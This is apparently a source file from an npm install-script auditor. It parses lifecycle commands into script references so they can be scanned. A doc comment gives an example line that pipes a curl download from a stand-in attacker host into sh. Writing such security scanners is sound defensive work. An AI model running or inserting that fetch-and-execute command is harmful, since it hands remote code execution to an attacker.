'use strict';

/**
 * Parse a lifecycle command string into a list of "script references".
 *
 * A script reference is either:
 *   { kind: 'file',  path: 'install.js',  interpreter: 'node' }   — analyze this file
 *   { kind: 'inline', code: '...',         interpreter: 'sh' }    — analyze this command string
 *
 * The parser splits on the standard shell separators `&&`, `||`, `;`, and `|`
 * (which all chain or redirect commands during npm install), then classifies
 * each segment. This means commands like:
 *
 *   "node pre.js && node post.js"
 *   "sh ./install.sh; node cleanup.js"
 *   "curl https://evil.com/x.sh | sh"
 *
 * all produce multiple references — earlier versions of np-audit only ever
 * extracted the first `node` invocation and ignored the rest.
 *
 * String literals (quoted) are kept intact so we don't split inside an
 * `-e "a && b"` argument or similar.
 */
function parseCommand(command) {
  if (!command || typeof command !== 'string') return [];

  const segments = splitOnShellSeparators(command.trim());
  const refs = [];

  for (const segment of segments) {
    if (!segment) continue;
    refs.push(...classifySegment(segment));
  }

  return refs;
}

/**
 * Split on &&, ||, ;, | — respecting single, double, and backtick quotes.
 */
function splitOnShellSeparators(cmd) {
  const out = [];
  let buf = '';
  let quote = null; // null | "'" | '"' | '`'

  for (let i = 0; i < cmd.length; i++) {
    const c = cmd[i];

    if (quote) {
      if (c === '\\' && i + 1 < cmd.length) {
        buf += c + cmd[i + 1];
        i++;
        continue;
      }
      if (c === quote) quote = null;
      buf += c;
      continue;
    }

    if (c === '"' || c === "'" || c === '`') {
      quote = c;
      buf += c;
      continue;
    }

    // && and ||
    if ((c === '&' || c === '|') && cmd[i + 1] === c) {
      out.push(buf);
      buf = '';
      i++;
      continue;
    }

    // single | (pipe) and ; — also segment boundaries for our purposes:
    // a pipe `foo | sh` clearly has two commands; a sequence `a ; b` too.
    if (c === '|' || c === ';') {
      out.push(buf);
      buf = '';
      continue;
    }

    buf += c;
  }
  out.push(buf);

  return out.map(s => s.trim()).filter(Boolean);
}

/**
 * Classify a single shell segment into one or more script references.
 */
function classifySegment(segment) {
  const tokens = tokenize(segment);
  if (tokens.length === 0) return [];

  const cmd = tokens[0];

  // Resolve common path-prefix wrappers
  // e.g. "./node_modules/.bin/foo" → "foo"
  const cmdBase = cmd.split('/').pop();

  // Node interpreters
  if (cmdBase === 'node' || cmdBase === 'nodejs') {
    return classifyNodeInvocation(tokens.slice(1), segment);
  }

  // Other JS runtimes
  if (cmdBase === 'tsx' || cmdBase === 'ts-node' || cmdBase === 'bun' || cmdBase === 'deno') {
    const fileArg = tokens.slice(1).find(t => !t.startsWith('-'));
    if (fileArg) {
      return [{ kind: 'file', path: stripDotSlash(fileArg), interpreter: cmdBase }];
    }
    return [{ kind: 'inline', code: segment, interpreter: cmdBase }];
  }

  // Shell-script interpreters
  if (cmdBase === 'sh' || cmdBase === 'bash' || cmdBase === 'zsh' || cmdBase === 'dash') {
    return classifyShellInvocation(tokens.slice(1), segment);
  }

  // Python and friends
  if (cmdBase === 'python' || cmdBase === 'python2' || cmdBase === 'python3'
      || cmdBase === 'ruby' || cmdBase === 'perl' || cmdBase === 'php') {
    const args = tokens.slice(1);
    for (let i = 0; i < args.length; i++) {
      const a = args[i];
      // -c "code", -e "code" — execute the next argument as code
      if (a === '-c' || a === '-e') {
        return [{ kind: 'inline', code: args[i + 1] || '', interpreter: cmdBase }];
      }
      if (a.startsWith('-')) continue;
      return [{ kind: 'file', path: stripDotSlash(a), interpreter: cmdBase }];
    }
    return [{ kind: 'inline', code: segment, interpreter: cmdBase }];
  }

  // `.js`/`.mjs`/`.cjs` files invoked directly (shebang)
  if (/\.(?:js|mjs|cjs|sh|bash|py|rb|pl)$/.test(cmdBase)) {
    return [{ kind: 'file', path: stripDotSlash(cmd), interpreter: 'auto' }];
  }

  // npx — running an arbitrary package. We can't statically know which file
  // it executes, but the command string itself is worth surfacing.
  if (cmdBase === 'npx') {
    return [{ kind: 'inline', code: segment, interpreter: 'shell', npx: true }];
  }

  // Anything else (curl, wget, cd, env, …): keep as inline so it shows up in
  // the report and is run through the obfuscation checks at least as a string.
  return [{ kind: 'inline', code: segment, interpreter: 'shell' }];
}

/**
 * Handle `node <args...>`. Cases:
 *   node script.js              → file
 *   node -e "..."               → inline (the code IS the argument)
 *   node -p "..."               → inline
 *   node --eval "..."           → inline
 *   node --experimental-foo s.js → file (skip flags, pick first non-flag)
 */
function classifyNodeInvocation(args, fullSegment) {
  for (let i = 0; i < args.length; i++) {
    const a = args[i];
    if (a === '-e' || a === '--eval' || a === '-p' || a === '--print') {
      const code = args[i + 1] || '';
      return [{ kind: 'inline', code: stripQuotes(code), interpreter: 'node' }];
    }
    if (a.startsWith('-')) continue;
    // First non-flag token is the script file
    return [{ kind: 'file', path: stripDotSlash(a), interpreter: 'node' }];
  }
  // No file, no -e — fall through to inline
  return [{ kind: 'inline', code: fullSegment, interpreter: 'node' }];
}

/**
 * Handle `sh <args...>`. Cases:
 *   sh script.sh                → file (the .sh file is fetched & scanned)
 *   sh -c "..."                 → inline (the code IS the argument)
 *   bash -c "..."               → inline
 */
function classifyShellInvocation(args, fullSegment) {
  for (let i = 0; i < args.length; i++) {
    const a = args[i];
    if (a === '-c') {
      const code = args[i + 1] || '';
      return [{ kind: 'inline', code: stripQuotes(code), interpreter: 'sh' }];
    }
    if (a.startsWith('-')) continue;
    return [{ kind: 'file', path: stripDotSlash(a), interpreter: 'sh' }];
  }
  return [{ kind: 'inline', code: fullSegment, interpreter: 'sh' }];
}

/**
 * Lightweight shell-style tokenizer — respects single, double, backtick quotes
 * and \-escapes. Does NOT do variable expansion (we want the literal command
 * the way npm would hand it to /bin/sh).
 */
function tokenize(s) {
  const out = [];
  let buf = '';
  let quote = null;

  for (let i = 0; i < s.length; i++) {
    const c = s[i];

    if (quote) {
      if (c === '\\' && i + 1 < s.length && quote === '"') {
        buf += s[i + 1];
        i++;
        continue;
      }
      if (c === quote) { quote = null; continue; }
      buf += c;
      continue;
    }

    if (c === '"' || c === "'" || c === '`') {
      quote = c;
      continue;
    }

    if (c === '\\' && i + 1 < s.length) {
      buf += s[i + 1];
      i++;
      continue;
    }

    if (/\s/.test(c)) {
      if (buf) { out.push(buf); buf = ''; }
      continue;
    }

    buf += c;
  }

  if (buf) out.push(buf);
  return out;
}

function stripDotSlash(p) {
  return p.replace(/^\.\//, '');
}

function stripQuotes(s) {
  if (s.length >= 2) {
    const f = s[0], l = s[s.length - 1];
    if ((f === '"' || f === "'" || f === '`') && f === l) {
      return s.slice(1, -1);
    }
  }
  return s;
}

module.exports = { parseCommand, splitOnShellSeparators, tokenize };
